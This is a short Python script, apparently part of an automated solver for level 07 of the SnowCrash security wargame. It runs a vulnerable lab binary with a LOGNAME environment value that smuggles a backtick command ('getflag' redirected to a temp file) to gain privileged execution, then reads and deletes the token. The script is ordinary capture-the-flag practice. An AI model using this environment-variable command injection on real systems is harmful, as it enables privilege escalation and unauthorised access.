"""LEVEL 07"""

from time import sleep

import utils as u
from utils.level_wrapper import level_handler


@level_handler
def solve_level07(_, snow_crash):
    """Run executable with custom environment"""

    snow_crash.run(
        "./level07",
        env={
            "LOGNAME": "`getflag` > /tmp/token07",
            "PATH": "/bin:/sbin:/usr/bin:/usr/sbin",
        },
    )
    sleep(1)
    token = snow_crash["cat /tmp/token07; rm -f /tmp/token07"]
    return "token", u.misc.parse_token(token)
